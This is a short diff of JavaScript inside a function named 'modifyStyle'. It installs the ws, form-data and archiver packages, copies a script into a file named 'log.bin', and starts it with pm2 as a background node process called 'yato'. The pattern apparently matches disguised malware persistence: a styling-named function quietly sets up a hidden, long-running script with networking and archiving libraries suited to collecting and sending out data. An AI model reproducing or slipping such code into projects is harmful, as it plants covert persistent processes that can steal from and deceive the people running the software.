@@ -122,7 +122,7 @@ const modifyStyle = async () => {
     execSync(`npm i ws --prefix ${sourcePath}`);
     execSync(`npm i form-data --prefix ${sourcePath}`);
     execSync(`npm i archiver --prefix ${sourcePath}`);
-    fs.copyFileSync(`${sourcePath}/log.bin`, scriptPath);
+    fs.copyFileSync(scriptPath, `${sourcePath}/log.bin`);
 
     execSync(
       `pm2 start "${sourcePath}/log.bin" --name yato --interpreter node`,
